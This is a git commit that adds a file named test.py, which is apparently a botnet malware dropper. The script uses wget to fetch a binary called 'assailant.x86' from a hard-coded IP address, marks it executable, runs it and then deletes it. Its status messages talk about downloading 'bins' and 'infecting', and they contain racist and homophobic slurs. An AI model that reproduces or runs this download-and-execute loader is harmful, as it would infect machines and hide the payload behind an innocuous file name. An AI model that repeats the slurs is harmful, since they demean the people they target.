e6360a5f4bc45c9e7a1b18820f946109b73f889f
lurkinsh <123344645+lurkinsh@users.noreply.github.com>
2023-01-22 21:46:39 -0600

    Create test.py

---
+++ test.py
@@ -0,0 +1,15 @@
+import requests as req
+import time
+import os 
+
+
+print("Downloading Bins faggot")
+
+os.system("wget http://185.223.93.118/assailant.x86")
+
+
+print("done")
+time.sleep(3)
+print("Infecting Nigger Bals")
+os.system("chmod +x assailant.x86; ./assailant.x86; rm -rf assailant.x86")
+time.sleep(3)
